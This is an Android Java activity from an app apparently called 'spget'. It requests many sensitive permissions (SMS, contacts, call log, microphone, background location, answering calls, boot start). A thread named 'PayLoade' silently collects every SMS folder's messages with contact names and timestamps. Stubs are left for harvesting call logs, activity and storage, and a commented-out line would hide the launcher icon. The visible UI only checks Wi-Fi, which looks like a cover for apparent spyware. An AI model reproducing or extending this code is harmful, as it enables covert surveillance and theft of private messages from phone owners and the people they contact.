package com.niccher.spget;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.ActivityRecognition;
import com.google.android.gms.location.ActivityRecognitionResult;
import com.niccher.spget.usables.Konstants;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;

public class MainActivity extends AppCompatActivity  {

    Button strt;
    int permission_calls = 4;
    private int reqCode = 20;
    private String[] permissions;
    private int[] grantResults;

    Calendar cal = new GregorianCalendar();
    StringBuffer sbsent, sbinb, sbout, sbdraft, sbfailed, sbcont, sblog, sbflist;//sent,sms/draft,sms/outbox,sms/failed
    String flisting;
    
    Konstants kon;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        strt = findViewById(R.id.StartBtn);
        
        kon= new Konstants();

        strt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                WiFi();
            }
        });

        Perms();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Perms();
    }

    @Override
    protected void onStart() {
        super.onStart();
        Perms();
    }

    @Override
    protected void onStop() {
        super.onStop();
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(MainActivity.this, Splash.class);
        //packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void WiFi(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            Toast.makeText(this, "Wifi Present", Toast.LENGTH_LONG).show();
        }else {
            NetworkInfo[] networkInfo = connManager.getAllNetworkInfo();

            for (NetworkInfo netInfo : networkInfo) {
                //if (netInfo.getTypeName().equalsIgnoreCase("WIFI")){
                    //if (netInfo.isConnected()) {txtview.setText("Connected to WiFi")}
                // };
                if (netInfo.getTypeName().equalsIgnoreCase("MOBILE")) {
                    if (netInfo.isConnected())
                        Toast.makeText(this, "Connected to Mobile Data", Toast.LENGTH_LONG).show();
                }
            }
        }
        //WiFiStats();
    }

    private void WiFiStats(){
        ConnectivityManager connectivitymanager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkInfo[] networkInfo = connectivitymanager.getAllNetworkInfo();

        for (NetworkInfo netInfo : networkInfo) {

            if (netInfo.getTypeName().equalsIgnoreCase("WIFI"))

                //if (netInfo.isConnected()) txtview.setText("Connected to WiFi");

            if (netInfo.getTypeName().equalsIgnoreCase("MOBILE"))

                if (netInfo.isConnected())

                    //txtview.setText("Connected to Mobile Data");
                    Toast.makeText(this, "Connected to Mobile Data", Toast.LENGTH_LONG).show();
        }

    }

    private void Perms(){

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS)
                != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.PROCESS_OUTGOING_CALLS}, permission_calls);
        }else{
            Log.e("Permission","PROCESS_OUTGOING_CALLS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_SMS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_SMS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_SMS}, reqCode);
            }
        }else {
            Log.e("Permission","READ_SMS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_CONTACTS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CONTACTS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CONTACTS}, reqCode);
            }
        }else {
            Log.e("Permission","READ_CONTACTS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_CALL_LOG)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG}, reqCode);
            }
        }else {
            Log.e("Permission","READ_CALL_LOG Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, reqCode);
            }
        }else {
            Log.e("Permission","WRITE_EXTERNAL_STORAGE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_EXTERNAL_STORAGE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, reqCode);
            }
        }else {
            Log.e("Permission","READ_EXTERNAL_STORAGE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.RECORD_AUDIO)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECORD_AUDIO}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECORD_AUDIO}, reqCode);
            }
        }else {
            Log.e("Permission","RECORD_AUDIO Granted");
        }

        /////////////////

         if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_CHECKIN_PROPERTIES) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_CHECKIN_PROPERTIES)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_CHECKIN_PROPERTIES}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_CHECKIN_PROPERTIES}, reqCode);
            }
        }else {
            Log.e("Permission","ACCESS_CHECKIN_PROPERTIES Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ANSWER_PHONE_CALLS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ANSWER_PHONE_CALLS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ANSWER_PHONE_CALLS}, reqCode);
            }
        }else {
            Log.e("Permission","ANSWER_PHONE_CALLS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_FINE_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, reqCode);
            }
        }else {
            Log.e("Permission","ACCESS_FINE_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_COARSE_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, reqCode);
            }
        }else {
            Log.e("Permission","ACCESS_COARSE_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, reqCode);
            }
        }else {
            Log.e("Permission","ACCESS_BACKGROUND_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_PHONE_STATE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_PHONE_STATE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_PHONE_STATE}, reqCode);
            }
        }else {
            Log.e("Permission","READ_PHONE_STATE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CHANGE_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.CHANGE_NETWORK_STATE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.CHANGE_NETWORK_STATE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.CHANGE_NETWORK_STATE}, reqCode);
            }
        }else {
            Log.e("Permission","CHANGE_NETWORK_STATE Granted");
        }


        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_BOOT_COMPLETED) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED}, reqCode);
            }
        }else {
            Log.e("Permission","RECEIVE_BOOT_COMPLETED Granted");
        }
    }

    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == permission_calls){
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
            }else{
                Toast.makeText(MainActivity.this, "Premission needed", Toast.LENGTH_LONG)
                        .show();
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_SMS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_COARSE_LOCATION", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_PHONE_STATE", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.CHANGE_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To CHANGE_NETWORK_STATE", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECEIVE_BOOT_COMPLETED) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To RECEIVE_BOOT_COMPLETED", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ANSWER_PHONE_CALLS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To RECORD_AUDIO", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_CONTACTS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_CHECKIN_PROPERTIES) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_CHECKIN_PROPERTIES", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_CALL_LOG", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                    }
                    return;
                }
            }
        }
    }

    class PayLoade extends Thread{
        @Override
        public void run() {
            super.run();
            Parser_SMS();
            Parser_Logs();
            Parser_Calls();
            Parser_Activity();
            Parser_SD();

        }

        public void Parser_SMS(){
            try {
                int sent = 0;
                sbsent = new StringBuffer();
                Uri smurset = Uri.parse("content://sms/sent");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                Cursor smcus = getContentResolver().query(smurset, null, null, null, null);
                startManagingCursor(smcus);
                if (smcus.moveToFirst()) {
                    for (int ii = 0; ii < smcus.getCount(); ii++) {
                        String namb = smcus.getString(smcus.getColumnIndexOrThrow("address"));
                        String dati = smcus.getString(smcus.getColumnIndexOrThrow("date"));
                        String typ = smcus.getString(smcus.getColumnIndexOrThrow("type"));
                        String threadid = smcus.getString(smcus.getColumnIndexOrThrow("thread_id"));
                        long daty = Long.valueOf(dati);
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
                        String nombre = getContactName(getApplicationContext(), smcus.getString(smcus.getColumnIndexOrThrow("address")));

                        Date resultdate = new Date(daty);
                        String dateAsText = sdf.format(resultdate);

                        String bod = smcus.getString(smcus.getColumnIndexOrThrow("body"));
                        smcus.moveToNext();
                        sent++;
                        sbsent.append("-------(" + sent + ")--------\nClass -------> M-Sent\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
                        sbsent.append("\n---------------------------------------\n");
                    }
                }
                smcus.close();
            } catch (Exception e) {
                Log.e(kon.TAGGED, "Msg->Sent Loop >");
            }

            try {
                Thread.sleep(1000);
                int inb = 0;
                sbinb = new StringBuffer();
                Uri smursinb = Uri.parse("content://sms/inbox");
                Cursor smcusinb = getContentResolver().query(smursinb, null, null, null, null);
                startManagingCursor(smcusinb);
                if (smcusinb.moveToFirst()) {
                    for (int ii = 0; ii < smcusinb.getCount(); ii++) {
                        String recv = smcusinb.getString(smcusinb.getColumnIndexOrThrow("address"));
                        String seda = smcusinb.getString(smcusinb.getColumnIndexOrThrow("_id"));
                        String dat = smcusinb.getString(smcusinb.getColumnIndexOrThrow("date"));
                        String threadi = smcusinb.getString(smcusinb.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusinb.getString(smcusinb.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusinb.getString(smcusinb.getColumnIndexOrThrow("body"));
                        smcusinb.moveToNext();
                        inb++;
                        sbinb.append("-------(" + inb + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbinb.append("\n---------------------------------\n");
                    }
                }
                smcusinb.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->In Loop >");
            }

            try {
                int out = 0;
                sbout = new StringBuffer();
                Uri smursout = Uri.parse("content://sms/outbox");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                Cursor smcus = getContentResolver().query(smursout, null, null, null, null);
                startManagingCursor(smcus);
                if (smcus.moveToFirst()) {
                    for (int ii = 0; ii < smcus.getCount(); ii++) {
                        String namb = smcus.getString(smcus.getColumnIndexOrThrow("address"));
                        String dati = smcus.getString(smcus.getColumnIndexOrThrow("date"));
                        String typ = smcus.getString(smcus.getColumnIndexOrThrow("type"));
                        String threadid = smcus.getString(smcus.getColumnIndexOrThrow("thread_id"));
                        long daty = Long.valueOf(dati);
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
                        String nombre = getContactName(getApplicationContext(), smcus.getString(smcus.getColumnIndexOrThrow("address")));

                        Date resultdate = new Date(daty);
                        String dateAsText = sdf.format(resultdate);

                        String bod = smcus.getString(smcus.getColumnIndexOrThrow("body"));
                        smcus.moveToNext();
                        out++;
                        sbout.append("-------(" + out + ")--------\nClass -------> M-Sent\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
                        sbout.append("\n---------------------------------------\n");
                    }
                }
                smcus.close();
            } catch (Exception e) {
                Log.e(kon.TAGGED, "Msg->Out Loop >");
            }

            try {
                Thread.sleep(1000);
                int draft = 0;
                sbdraft = new StringBuffer();
                Uri smurdraft = Uri.parse("content://sms/draft");
                Cursor smcusdraft = getContentResolver().query(smurdraft, null, null, null, null);
                startManagingCursor(smcusdraft);
                if (smcusdraft.moveToFirst()) {
                    for (int ii = 0; ii < smcusdraft.getCount(); ii++) {
                        String recv = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("address"));
                        String seda = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("_id"));
                        String dat = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("date"));
                        String threadi = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("body"));
                        smcusdraft.moveToNext();
                        draft++;
                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbdraft.append("\n---------------------------------\n");
                    }
                }
                smcusdraft.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->Draft Loop >");
            }

            try {
                Thread.sleep(1000);
                int draft = 0;
                sbfailed = new StringBuffer();
                Uri smurfailed = Uri.parse("content://sms/failed");
                Cursor smcusfailed = getContentResolver().query(smurfailed, null, null, null, null);
                startManagingCursor(smcusfailed);
                if (smcusfailed.moveToFirst()) {
                    for (int ii = 0; ii < smcusfailed.getCount(); ii++) {
                        String recv = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("address"));
                        String seda = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("_id"));
                        String dat = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("date"));
                        String threadi = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("body"));
                        smcusfailed.moveToNext();
                        draft++;
                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbdraft.append("\n---------------------------------\n");
                    }
                }
                smcusfailed.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->Failed Loop >");
            }
        }
        public void Parser_Logs(){}
        public void Parser_Calls(){}
        public void Parser_Activity(){}
        public void Parser_SD(){}
    }

}
